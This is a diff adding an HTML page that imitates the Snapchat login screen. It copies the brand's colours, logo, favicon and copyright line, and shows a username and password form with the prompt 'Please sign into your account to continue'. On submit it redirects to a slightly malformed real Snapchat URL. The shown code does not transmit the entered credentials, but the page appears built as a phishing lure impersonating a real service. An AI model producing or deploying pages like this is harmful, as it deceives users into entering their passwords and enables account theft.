@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log In - Snapchat</title>
+    <link rel="shortcut icon" type="image/png" href="https://accounts.snapchat.com/favicon.ico"/>
+    <style>
+        body {
+            margin: 0;
+            font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+            background-color: #fffc01; /* Yellow background */
+            color: #262626; /* Text color for contrast */
+            text-align: center; /* Center-align all content */
+        }
+        a {
+            color: #009fda;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .inputBox {
+            font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+            margin: 0;
+            padding: .67861em 1em;
+            font-size: 1em;
+            background-color: #fff;
+            border: 1px solid rgba(39,41,43,.15);
+            color: rgba(0,0,0,.8);
+            border-radius: 25px; /* Modern rounded look */
+            width: 304px;
+            height: 45px; /* Slightly taller for better user experience */
+            margin-bottom: 15px;
+            font-size: 14px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1); /* Subtle shadow for depth */
+        }
+        button {
+            cursor: pointer;
+            display: inline-block;
+            background-color: #fffc01; /* Yellow background */
+            color: #262626; /* Text color */
+            font-family: HelveticaNeue-Light, 'Helvetica Neue Light', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif;
+            padding: 13px 1.5em;
+            font-weight: 700;
+            text-align: center;
+            text-transform: uppercase;
+            border-radius: 25px; /* Rounded button */
+            width: 304px;
+            height: 45px;
+            border: none;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1); /* Subtle shadow for depth */
+        }
+        button:hover {
+            background-color: #f4f100; /* Darker yellow for hover effect */
+        }
+        .header {
+            position: fixed;
+            background-color: #fff;
+            width: 100%;
+            top: 0;
+            height: 20px;
+            padding: 15px;
+            color: #000;
+            font-size: 14px;
+            text-align: center;
+            z-index: 1000; /* Ensure it stays on top */
+        }
+        .logo {
+            width: 50px; /* Adjust size as needed */
+            padding-top: 80px;
+            padding-bottom: 95px;
+        }
+        a.forgot-password {
+            display: block; /* Make sure it appears on a new line */
+            margin-top: 20px; /* Adjust space as needed */
+        }
+        .footer {
+            background-color: #fff;
+            color: #000;
+            padding: 20px;
+            font-size: 14px;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            border-top: 1px solid #ddd;
+            text-align: center;
+        }
+        .footer-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-wrap: wrap; /* Allow wrapping on smaller screens */
+            gap: 15px; /* Space between items */
+        }
+        .footer-content a {
+            margin: 0;
+            padding: 5px 10px;
+            color: #009fda;
+            font-weight: bold;
+        }
+        .footer-content a:hover {
+            text-decoration: underline;
+        }
+        .footer p {
+            margin: 10px 0 0; /* Space between the links and copyright text */
+        }
+    </style>
+    <script>
+        function redirectToReset() {
+            window.location.href = 'https://accounts.snapchat.com/accounts/v2/login?ai=dHR0&continue=%fee2Faccounts%2Fwelcomecv';
+        }
+    </script>
+</head>
+<body>
+    <div>
+        <img src="https://accounts.snapchat.com/accounts/static/images/ghost/ghost.svg" class="logo" alt="Snapchat Logo">
+        <h1>Log In</h1>
+        <form onsubmit="redirectToReset(); return false;">
+            <input class="inputBox" id="username" name="username" type="text" placeholder="Username" required><br>
+            <input class="inputBox" id="password" name="password" type="password" placeholder="Password" required><br>
+            <button type="submit">LOG IN</button>
+        </form>
+        <a href="https://accounts.snapchat.com/accounts/password_reset_request" class="forgot-password">Forgot your password?</a>
+        <div class="header">
+            Please sign into your account to continue
+        </div>
+    </div>
+    <div class="footer">
+        <div class="footer-content">
+            <a href="#">Help Center</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">About Us</a>
+        </div>
+        <p>&copy; 2024 Snapchat Inc. All rights reserved.</p>
+    </div>
+</body>
+</html>
